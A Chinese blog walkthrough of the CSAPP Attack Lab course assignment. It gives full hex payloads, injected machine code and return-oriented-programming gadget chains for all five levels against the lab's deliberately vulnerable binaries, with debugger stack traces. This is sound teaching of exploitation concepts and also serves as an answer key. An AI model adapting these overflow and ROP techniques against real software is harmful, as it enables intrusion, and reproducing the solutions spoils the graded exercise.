---
title: ⚔️ CSAPP AttackLab 实验指南
description: 实验三，利用缓冲区溢出来篡改程序
slug: csapp_attacklab
date: 2025-12-12
image: stack.png
categories:
    - 学习
tags:
    - csapp
weight: 0
---

> ⚠️ 注意，本文只提供个人的解法与思路，不能代替自己亲手用调试器做实验。如果你希望更好地锻炼自己的能力，仅仅在你尝试过，并且被卡住时候，观看对应章节的内容。或者，在你独立做完实验，可以与本指南中的内容核对。也欢迎各位对本文中的拼写错误、细节遗漏等方面进行补充！

本文所有内容都是手写，但最后一部分 rtarget-touch3 向 AI 询问过思路。

本文编写时没有参考 [更适合北大宝宝体质的 Attack Lab 踩坑记](https://arthals.ink/blog/attack-lab)，不过各位可以自行参考。

## 实验介绍与准备
该实验的目的是通过制造一些独特的输入字符串，进而在调用 getbuf 函数的时候修改栈上的值，进而操纵程序，达到指定的效果。主要考核的是 CSAPP 第三章缓冲区溢出部分。

根据希冀平台，实验提供的文件如下：
- README.txt：描述本目录内容的文件。
- ctarget：一个容易遭受code-injection攻击的可执行程序。
- rtarget：一个容易遭受return-oriented-programming攻击的可执行程序。
- cookie.txt：一个8位的十六进制码，在后面解题会用到.
- farm.c：你的目标“gadget farm”的源代码，在产生return-oriented programming攻击时会用到。
- hex2raw：一个生成攻击字符串的工具。

以下指南基于读者拥有 BombLab 的基础，参考 [💣 CSAPP BombLab 实验指南]({{< ref "/post/learn/csapp/bomblab/index" >}})。以及，调试器使用 pwndbg，参考 [pwndbg 教程与自定义配置]({{< ref "/post/tech/pwndbg/index" >}})。

## 常用工具
### 反汇编
使用 objdump 命令来反汇编：
```bash
objdump -d ctarget > ctarget.s
```

### 构造任意字符串序列
使用本实验提供的 hex2raw 程序，从十六进制序列生成相应的字符串。可以利用 linux 的文件重定向来调用程序，指定输入与输出文件[^1]：
```bash
./hex2raw < exploit.txt > exploit-raw.txt
```
这里只需要将十六进制文件放到 `exploit.txt` 中，例如是下面的序列：
```
37 38 39 3a 3b 3c 00
```
每两个字符代表一个位，使用空格、换行符来分割。最后生成的 `exploit-raw.txt` 文件可以作为 ctarget 或者 rtarget 程序的输入。

### 根据汇编生成字符串序列
可以首先编写一个汇编程序，编译，再反编译。例如，创建汇编文件 `example.s`：
```asm
# Example of hand-generated assembly code
pushq   $0xabcdef             # Push value onto stack
addq    $17,%rax              # Add 17 to %rax
movl    %eax,%edx             # Copy lower 32 bits to %edx
```

利用生成汇编文件 `example.o`，再反汇编命令得到 `example.d`：
```bash
gcc -c example.s;

objdump -d example.o > example.d
```

`example.d`中有下面的部分：
```
0000000000000000 <.text>:
   0: 68 ef cd ab 00             pushq  $0xabcdef
   5: 48 83 c0 11                add    $0x11,%rax
   9: 89 c2                      mov    %eax,%edx
```

这当中的字节序列就是 `68 ef cd ab 00 48 83 c0 11 89 c2`，可以将这部分作为 hex2raw 的输入。

## 目标程序
本实验需要攻克 ctarget 与 rtarget 两个程序。两个程序都使用 getbuf 函数读取字符串：
```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE]; 
    Gets(buf); 
    return 1;
}
```
其中的 Gets 函数从标准输入读取字符串，直到遇到 `\n` 或者 `\0` 结束。该函数并不会有输入的上限，因此输入的字符串可能会超出 BUFFER_SIZE 大小，进而改变栈上的内容。

运行 ctarget 或者 rtarget 程序，如果输入字符串足够短，getbuf 会返回1：
```
unix$ ./ctarget
Cookie: 0x5534d1f8
Type string:Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```

如果输入太长，会发生段错误：
```
unix$ ./ctarget
Cookie: @x5534d1f8
Type string:This is not a very interesting string, but it has the property ... Ouch!: You caused a segmentation fault!
Ouch!: You caused a segmentation fault!
Better luck next time
FAILED
```

实验的目的就是构造字符串，利用缓冲区溢出来修改栈上内容，达成期望的目的。

两个程序有命令行参数 `-i FILE`，其中 `FILE` 是输入文件的路径。可以用这个方法来方便调试。例如，使用 hex2raw 生成了 `exploit1-raw.txt` 文件，可以在 `~/.gdbinit` 文件中编辑，利用下面的方式来设置调试的时候使用命令行参数：
```
set args -i exploit1-raw.txt
```


## ctarget-touch1

这一部分攻击 ctarget 程序，需要更改 getbuf 的返回值对应的栈，不再返回 test 函数，而是返回到另一个函数 touch1。

getbuf 函数对应汇编为：
```asm
000000000040167f <getbuf>:
  40167f:	48 83 ec 18          	sub    $0x18,%rsp
  401683:	48 89 e7             	mov    %rsp,%rdi
  401686:	e8 59 02 00 00       	call   4018e4 <Gets>
  40168b:	b8 01 00 00 00       	mov    $0x1,%eax
  401690:	48 83 c4 18          	add    $0x18,%rsp
  401694:	c3                   	ret
```

从汇编中可以看出，该函数一开始在栈上拓展了 0x18 也就是 24 字节的空间，然后调用 Gets 函数。栈的布局如下：
```
00:0000│ rsp 0x55654c98 ◂— 0
01:0008│     0x55654ca0 ◂— 0
02:0010│     0x55654ca8 —▸ 0x55586000 ◂— 0
03:0018│     0x55654cb0 —▸ 0x401829 (test+1)
```

所以，我们可以首先输入 24 个完全无关的字符，然后开始输入真正重要的信息，让它跳转到 touch1 函数。touch1 函数汇编如下：
```asm
0000000000401695 <touch1>:
  401695:	48 83 ec 08          	sub    $0x8,%rsp
  401699:	c7 05 59 2e 20 00 01 	movl   $0x1,0x202e59(%rip)        # 6044fc <vlevel>
  4016a0:	00 00 00 
  4016a3:	bf 87 2d 40 00       	mov    $0x402d87,%edi
  4016a8:	e8 33 f5 ff ff       	call   400be0 <puts@plt>
  4016ad:	bf 01 00 00 00       	mov    $0x1,%edi
  4016b2:	e8 e8 03 00 00       	call   401a9f <validate>
  4016b7:	bf 00 00 00 00       	mov    $0x0,%edi
  4016bc:	e8 6f f6 ff ff       	call   400d30 <exit@plt>
```

其地址为 0x401695。注意，x86 使用小端序，也就是低地址对应的是低位的数。所以应该倒过来构造 95 16 40 00 00 ... 00 这一串，前面加上任意 24 个字符即可。这里简单地使用 00 填充。

因此第一关对应的十六进制序列如下：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
95 16 40 00 00 00 00 00
``` 

使用新的输入，执行完 gets 后，栈变成了这样：
```
00:0000│ rax rsp 0x55654c98 ◂— 0
... ↓            2 skipped
03:0018│         0x55654cb0 —▸ 0x401695 (touch1) ◂— subq $8, %rsp
```
因此变成返回到 touch1 处，执行 ret 后就可以跳转到目标。

## ctarget-touch2

touch2 的 C 代码如下：
```c
void touch2(unsigned val)
{
    vlevel = 2;       /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这一关目的是不返回 test，而是执行 touch2 代码，并且输入正确的参数。首先仿照 touch1，让代码跳转到 touch2 的地址，即 0x4016c1。

```asm
00000000004016c1 <touch2>:
  4016c1:	48 83 ec 08          	sub    $0x8,%rsp
  4016c5:	89 fa                	mov    %edi,%edx
  4016c7:	c7 05 2b 2e 20 00 02 	movl   $0x2,0x202e2b(%rip)        # 6044fc <vlevel>
  4016ce:	00 00 00 
  4016d1:	39 3d 2d 2e 20 00    	cmp    %edi,0x202e2d(%rip)        # 604504 <cookie>
  4016d7:	74 28                	je     401701 <touch2+0x40>

```

通过调试可以看出来，touch2 中有一个关键的比较，也就是其中 `cmp %edi,0x202e2d(%rip)`——将第一个参数寄存器 edi 与一个固定的值比较，该值为 0x3d9549ca，也是 cookie 文件中的值。因此，我们要想办法将寄存器 edi 修改为这个值，然后再调用 touch2 代码。

通过介绍的根据汇编生成字符串序列，可以得出更改 edi 的代码的字节表示：
```asm
bf ca 49 95 3d       	mov    $0x3d9549ca,%edi
```

所以，我们需要将最开始的返回值修改为当前栈的位置，而这个位置就是我们希望插入的代码。调试发现栈的位置为 `0x55654c98`。

但是，在 mov 代码之外，还需要想办法调用 touch2。注意题目的提示：
>  不要在攻击代码中使用jmp或call指令。所有的控制转移都要使用ret指令，即使实际上你并不是要从一个函数调用返回。

因此，我们需要在执行完 mov 后，想办法让栈指针 rsp 指向的位置的值变成我们期望跳转的地址，然后运行 ret。**这里需要使用 pushq 推入栈**。

因此代码注入部分如下：
```
bf ca 49 95 3d       	mov    $0x3d9549ca,%edi
68 c1 16 40 00       	push   $0x4016c1
c3                   	ret
```
这些部分占了 11 个字节，之后再填充 13 字节的任意信息，然后再是初始返回值的位置。因此完整的十六进制字符串如下：
```
bf ca 49 95 3d 68 c1 16
40 00 c3 00 00 00 00 00 
00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00 
00 00 00 00 00 00 00 00
```

进入调试，可以看到运行 gets 后，栈信息如下：
```
00:0000│ rax rsp 0x55654c98 ◂— movl $0x3d9549ca, %edi 
01:0008│         0x55654ca0 ◂— addb %al, %bl /* 0xc30040; '@' */
02:0010│         0x55654ca8 ◂— 0
03:0018│         0x55654cb0 —▸ 0x55654c98
```
这里其实 pwndbg 对于 0x55654ca0 处解释成了另外的操作，运行起来会发现是没有问题的。当函数通过 0x55654cb0 返回后，rip 跳转到 0x55654c98 位置（当前 rsp 位置），信息如下：

```
0x55654c98    movl   $0x3d9549ca, %edi     EDI => 0x3d9549ca
0x55654c9d    pushq  $touch2
0x55654ca2    retq
```
这正是我们期望注入的代码。之后 ret 会正确跳转到 touch2 的位置。完成了 ctarget 的第二部分。

## ctarget-touch3

touch3 代码如下：
```c
void touch3(char *sval)
{
    vlevel = 3;       /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```
这一关需要我们注入一个合适的字符串，并且修改寄存器 edi 为指向字符串的指针。

首先如法炮制，在 getbuf 中修改返回的地址，跳转到 touch3。此时对应十六进制为：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 17 40 00 00 00 00 00
00 00 00 00 00 00 00 00
```

调试可以发现此时栈的结构：
```
00:0000│ rax rsp 0x55654c98 ◂— 0
... ↓            2 skipped
03:0018│         0x55654cb0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
04:0020│         0x55654cb8 ◂— 0
05:0028│         0x55654cc0 —▸ 0x401d00 (launch+55) ◂— hlt
```

我们修改的就是 0x55654cb0。注意，如果需要存储字符串，需要放在该地址的“更低处”（这里“低”仅仅形容上面栈的示意结构，栈是从地址高到地址低的，也就是要放在更高地址的地方），后面 touch3、 hexmatch 等函数都会拓展栈，导致覆盖原先字符串。例如，单步调试进入 hexmatch 函数，发现栈变成这样：
```
00:0000│ rsp 0x55654c90 —▸ 0x6062a0 ◂— 0xfbad2488
01:0008│     0x55654c98 —▸ 0x55685fe8 —▸ 0x402c5e ◂— pushq $0x3a6971 /* 'hqi:' */
02:0010│     0x55654ca0 ◂— 3
03:0018│     0x55654ca8 —▸ 0x4017c9 (touch3+28) ◂— testl %eax, %eax
04:0020│     0x55654cb0 —▸ 0x55586000 ◂— 0
05:0028│     0x55654cb8 ◂— 0
06:0030│     0x55654cc0 —▸ 0x401d00 (launch+55) ◂— hlt
```

从 0x55654cb0 到 0x55654c90 部分都会被覆盖，之后还会额外开拓 7 * 16 的地址。所以，字符串应该放在 0x55654cb8 这种位置。

通过 ascii 对应关系，可知 cookie 0x3d9549ca对应的十六进制为：
```
33 64 39 35 34 39 63 61
```

现在输入改为
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 17 40 00 00 00 00 00
33 64 39 35 34 39 63 61
00
```

调试可以发现，调用 gets 后，栈的结构如下：
```
00:0000│ rax rsp 0x55654c98 ◂— 0
... ↓            2 skipped
03:0018│         0x55654cb0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
04:0020│         0x55654cb8 ◂— xorl 0x35(%rcx, %rdi), %esp /* 0x6163393435396433; '3d9549ca' */
```
这时候 0x55654cb8 对应的字符串就是 3d9549ca，下一位是 0x00，所以这个字符串拥有一个终止符。

之后，仿照 touch2 如法炮制，将 edi 修改为 0x55654cb8 即可。汇编代码如下：
```asm
bf b8 4c 65 55       	mov    $0x55654cb8,%edi
68 ad 17 40 00       	push   $0x4017ad
c3                   	ret
```

所以我们最终注入的十六进制形式如下：
```
bf b8 4c 65 55 68 ad 17
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
33 64 39 35 34 39 63 61
00
```

这当中：
- 第一行与第二行是三句汇编代码，目的是修改 edi 寄存器，并且进入到 touch3 函数；
- 第四行修改了 getbuf 函数的返回地址，变成了返回到栈上的位置，进而执行注入的脚本；
- 第五行是插入的字符串。



## rtarget-touch2
从这一关开始，程序变成了 rtarget，而不是 ctarget，增加了难度：
- 采用随机化，每次运行时栈的位置不同，无法将代码注入到栈上写死的位置；
- 栈的区域不可执行，就算跳转到该区域也会段错误。

这导致需要使用面向结果的编程，也就是利用反汇编中的特定编码（gadget），来执行操作。这一关卡只能使用 start_farm（0x401844） 与end_farm（0x401961） 之间的函数。

该阶段需要完成之前 touch2 一样的任务——修改 edi 寄存器为 0x3d9549ca，然后调用 touch2 代码。并且，只能使用两个 gadget。

提示说到使用 popq，可以从栈中弹出数据，这样我们当前 rsp 指向的位置的值会写入寄存器，同时也会改变栈的位置，可以进行跳转操作。

我们希望将值写入 edi，即 popq edi（rdi），对应的命令为 5f，但是经过搜索，我们发现并不存在。搜索其他的 58 到 5e 指令（都是 popq），发现只有 58 指令存在，并且很多。我们在执行 58 指令后，需要返回，也就是紧跟着 c3，查询后发现下面的片段：
```
000000000040185f <setval_219>:
  40185f:	c7 07 98 d2 58 c3    	movl   $0xc358d298,(%rdi)
  401865:	c3                   	ret
```
其 58 c3 序列开始的地址为 0x401863 （在 0x40185f 的基础上加4），这就是第一个需要的地址。

在执行 popq rax 后，接下来再将 rax 的值写入 rdi，也就是 movq rax rdi。

这两个命令都需要有89 c7，再加上末尾的 c3 返回指令，序列位 89 c7 c3，存在两个：
- setval_422
- setval_246

```
0000000000401858 <setval_422>:
  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40185e:	c3                   	ret

0000000000401866 <setval_246>:
  401866:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40186c:	c3                   	ret
```

选取其中 setval_422，对应地址为 0x40185a（理论上从 0x40185b 处开始也可以，就是 movq 与 movl 的区别，没有影响）。

现在要想办法更改栈的返回地址，进而达成效果。栈原先返回位置肯定是到达第一个 gadget 的位置，然后再下面是 cookie 的值，这样使用 popq 进入寄存器。最后是第二个 gadget 的位置。

尝试如下：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
63 18 40 00 00 00 00 00
ca 49 95 3d 00 00 00 00
5a 18 40 00 00 00 00 00
```
这里第四行是在 getbuf 中执行 ret 时候，rsp 指向的位置，跳转到第一个 gadget，同时 rsp 指向下一行。接着第一个 gadget 执行 popq rax，将 cookie 值写入 rax，同时 rsp 执行下一行。再执行 ret，跳转到第二个gadget。

进入 gets 前栈的形态（这里的地址都是随机的，所以不一样。重要的是最左侧的相对关系）：
```
00:0000│ rsp 0x7ffffffc2950 ◂— 0
01:0008│     0x7ffffffc2958 ◂— 0
02:0010│     0x7ffffffc2960 —▸ 0x7fffffffe108
03:0018│     0x7ffffffc2968 —▸ 0x401829 (test+14)
04:0020│     0x7ffffffc2970 ◂— 7
05:0028│     0x7ffffffc2978 —▸ 0x401e35 (launch+73)
```

更改后：
```
00:0000│ rax rsp 0x7ffffffc2950 ◂— 0
... ↓            2 skipped
03:0018│         0x7ffffffc2968 —▸ 0x401863 (setval_219+4) ◂— popq %rax
04:0020│         0x7ffffffc2970 ◂— 0x3d9549ca
05:0028│         0x7ffffffc2978 —▸ 0x40185a (setval_422+2)
```

在 getbuf 中会对 rsp 减小 0x18，rsp 指向 setval_219+4 的位置。然后执行 ret 后，栈如下：
```
00:0000│ rsp 0x7ffffffc2970 ◂— 0x3d9549ca
01:0008│     0x7ffffffc2978 —▸ 0x40185a (setval_422+2)
```

现在会执行 popq rax，将 rax 变成期望的 cookie，同时 rsp 执行了下面的 setval_422+2。执行 retq，函数跳转到第二个 gadget，执行 movq %rax, %rdi。

但是，如果只是刚刚的修改，因为这时候栈指向的地方都没有内容，会跳转到随机地址，导致段错误。因此还需要进一步修改，跳转到 touch2 0x4016c1。最终十六进制如下：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
63 18 40 00 00 00 00 00
ca 49 95 3d 00 00 00 00
5a 18 40 00 00 00 00 00
c1 16 40 00 00 00 00 00
```

这样就完成了 rtarget touch2。


## rtarget-touch3

这一关需要使用更多 gadget，修改 edi 寄存器为一个指向字符串的指针，然后调用 touch3 函数。指南说该部分允许使用这些汇编命令（实际上后面发现还需要别的）：
- movq
- movl
- ret
- nop
- 单字节操作
	- andb
	- orb
	- cmpb
	- testb

我们的字符串肯定是放在栈上面的，因此需要想办法得到字符串的地址，需要涉及到栈指针 rsp，将 rsp 的值读入寄存器。搜寻 movq rsp 相关指令，发现都以 48 89 e 开头，最后一个数是 0-7。搜索发现只存在 48 89 e0。我们还需要后面跟着返回或者空，经过搜索有 setval_232、addval_479 符合条件。这里使用 setval_232：
```
0000000000401919 <setval_232>:
  401919:	c7 07 c8 48 89 e0    	movl   $0xe08948c8,(%rdi)
  40191f:	c3                   	ret
```
该指令将 rsp 放入 rax，地址为 0x40191c。

但是，仅仅靠这些指令不足以完成加法操作。所以，还是要使用其它代码，例如可以在 gadget 中发现这个：
```
0000000000401887 <add_xy>:
  401887:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  40188b:	c3                   	ret
```
该函数的功能是将 rdi 与 rsi 相加，放入 rax，这正是我们需要的加法。

为了调用它，需要想办法将刚刚放入 rax 的值转移到 rdi 或者 rsi，搜索相关 gadget 48 89 c，发现只有 48 89 c7 满足条件，也就是放入 rdi 寄存器，有两个 setval_422、setval_246，这里选择前者：
```
0000000000401858 <setval_422>:
  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40185e:	c3                   	ret
```

所以，接下来需要将某个偏移量常数放入 rsi。可以仿照 r-touch2 的思路，使用 popq 将期望的值写入寄存器，当前 gadget 中所有相关函数中也只有 58，即 popq $rax，如下：
```
000000000040185f <setval_219>:
  40185f:	c7 07 98 d2 58 c3    	movl   $0xc358d298,(%rdi)
  401865:	c3                   	ret

```
地址为 0x401863，同 r-touch2。

之后需要将该值放入 rsi。但是我们发现 movq 指令中，rax 还是只能移动到 rdi，而 rdi 无法移动到别的寄存器。

这时候更改思路，考虑使用 movl，因为此时是一个很小的常数，所以32位还是64位没有影响。搜索 89 c 开头，发现满足 0-6 要求的只有 89 c1（如果是 89 c7，那么还是移动到了 edi，不行）。

初看下来，并不存在 89 c1 c3，也就是不直接跟着返回值。但是，考虑到之前提供的一些多余代码，也就是对单位进行操作但不影响其他结果的运算，发现有下属条件满足
- getval_201，20 d2 表示 andb dl, dl
- setval_231，08 db 表示 orb bl, bl

这里选择前者，地址为 0x401921，目的是将 eax 放入 ecx：
```
0000000000401920 <getval_201>:
  401920:	b8 89 c1 20 d2       	mov    $0xd220c189,%eax
  401925:	c3                   	ret
```

继续搜索 ecx 如何转移，也就是 89 c 开头，8-f。发现存在许多 89 ca，将 ecx 放入 edx。如法炮制，找到一个合理的 gadget：
```
00000000004018a1 <addval_245>:
  4018a1:	8d 87 89 ca 20 c0    	lea    -0x3fdf3577(%rdi),%eax
  4018a7:	c3                   	ret

```
这当中 89 ca 后面的 20 c0 代表 andb %al, %al。地址为 0x4018a3。

继续搜索 edx，也就是 89 d 开头，0-7，发现存在 89 d6，也就是放入 esi，终于达成了目标（除了 getval_301 之外还存在 setval_222，任选一个即可）
```
00000000004018c9 <getval_301>:
  4018c9:	b8 89 d6 20 d2       	mov    $0xd220d689,%eax
  4018ce:	c3                   	ret
```
地址为 0x4018ca。

在最后计算出 rax 之后，还需要转移到输入参数 rdi 当中，重复使用上面用过的 movq %rax, %rdi。


整理一下目前为止的 gadget

| 地址       | 汇编指令                 |
| -------- | ------------------------ |
| 0x40191c | movq %rsp, %rax          |
| 0x40185a | movq %rax, %rdi          |
| 0x401863 | popq %rax                |
| 0x401921 | movl $eax, %ecx          |
| 0x4018a3 | movl $ecx, %edx          |
| 0x4018ca | movl $edx, %esi          |
| 0x401887 | lea  (%rdi,%rsi,1),%rax |
| 0x40185a | movq %rax, %rdi          |

注意需要计算偏移量。发现相隔有 9 行，也就是 9 * 8 = 72 个字节，十六进制为 0x48。
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
1c 19 40 00 00 00 00 00 # 取rsp，调用gadget时，rsp指向下一行
5a 18 40 00 00 00 00 00
63 18 40 00 00 00 00 00
48 00 00 00 00 00 00 00 # 这里是设计的偏移量，72 字节，对应 0x48
21 19 40 00 00 00 00 00
a3 18 40 00 00 00 00 00
ca 18 40 00 00 00 00 00
87 18 40 00 00 00 00 00
5a 18 40 00 00 00 00 00
ad 17 40 00 00 00 00 00 # 调用touch3
33 64 39 35 34 39 63 61 # 储存的cookie字符串
00  # 确保字符串以 \0 结束
```

使用 pwndbg，可以发现在 getbuf 执行 ret 这一行的时候，栈信息如下：
```
00:0000│ rsp 0x7ffffffb3858 —▸ 0x40191c (setval_232+3) ◂— movq %rsp, %rax
01:0008│     0x7ffffffb3860 —▸ 0x40185a (setval_422+2) ◂— movq %rax, %rdi
02:0010│     0x7ffffffb3868 —▸ 0x401863 (setval_219+4) ◂— popq %rax
03:0018│     0x7ffffffb3870 ◂— 0x48 /* 'H' */
04:0020│     0x7ffffffb3878 —▸ 0x401921 (getval_201+1) ◂— movl %eax, %ecx
05:0028│     0x7ffffffb3880 —▸ 0x4018a3 (addval_245+2) ◂— movl %ecx, %edx
06:0030│     0x7ffffffb3888 —▸ 0x4018ca (getval_301+1) ◂— movl %edx, %esi
07:0038│     0x7ffffffb3890 —▸ 0x401887 (add_xy) ◂— leaq (%rdi, %rsi), %rax
08:0040│     0x7ffffffb3898 —▸ 0x40185a (setval_422+2) ◂— movq %rax, %rdi
09:0048│     0x7ffffffb38a0 —▸ 0x4017ad (touch3) ◂— pushq %rbx
```

后续执行也与我们分析的一样，成功完成最后一关！


## 参考资料
[^1]: 课程概览与 shell. Missing Semester 中文版. https://missing-semester-cn.github.io/2020/course-shell/
